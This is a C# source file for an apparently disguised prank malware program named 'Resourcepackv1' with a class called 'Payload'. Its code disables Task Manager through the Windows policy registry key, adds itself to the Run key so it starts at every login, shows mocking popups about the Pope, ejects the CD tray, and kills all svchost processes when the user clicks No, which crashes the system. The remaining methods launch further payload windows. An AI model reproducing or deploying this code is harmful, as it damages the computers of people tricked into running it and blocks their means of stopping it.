using System;
using Microsoft.Win32;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Threading;
using System.Diagnostics;


namespace Resourcepackv1
{
    public class Payload
    {
        [DllImport("winm.dll", EntryPoint = "mciSendString")]
        public static extern int MciSendString(string lpstrCommand, string lpstrReturnString, int uReturnLenght, int hwndCallback);
        public void Blocktask()
        {
            RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            if (key.GetValue("DisableTaskMgr") == null)
            {
                key.SetValue("DisableTaskMgr", "1");
            }
   
        }
        public void Autostart()
        {
            RegistryKey reg = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
            if (reg.GetValue("Resourcepackv1") == null)
            {
                reg.SetValue("Resoursepackv1", Application.ExecutablePath.ToString());
            }
            MessageBox.Show("Tak jak pan Jezus powiedział", "Karol Wojtyła", MessageBoxButtons.OK);
        }
        public void Kremowka()
        {
            DialogResult dialog = MessageBox.Show("Do you want to insert Kremówka?", "JuanPaulPedo", MessageBoxButtons.YesNo);
            if(dialog == DialogResult.Yes)
            {
                try 
                {
                    int result = MciSendString("set cdaudio door open", null, 0, 0);
                    Thread.Sleep(10000);
                    result = MciSendString("set cdaudio door close", null, 0, 0);
                }
                catch(Exception ex) { }
                
            }
            else
            {
                Process[] processes = Process.GetProcessesByName("svchost");
                foreach(var pr in processes)
                {
                    pr.Kill();
                }
            }
        }
        public void Payload1()
        {
            Thread thread = new Thread(() =>
            {
                Application.Run(new Form2());
            });
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
        }
        public void Payload2()
        {
            Thread thread = new Thread(() =>
            {
                Application.Run(new Form3());
            });
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
        }
        public void Payload3()
        {
            Thread thread = new Thread(() =>
            {
                Application.Run(new Form4());
            });
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
        }
        public void Payload4()
        {
            Thread thread = new Thread(() =>
            {
                Application.Run(new Form1());
            });
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
        }
    }
}
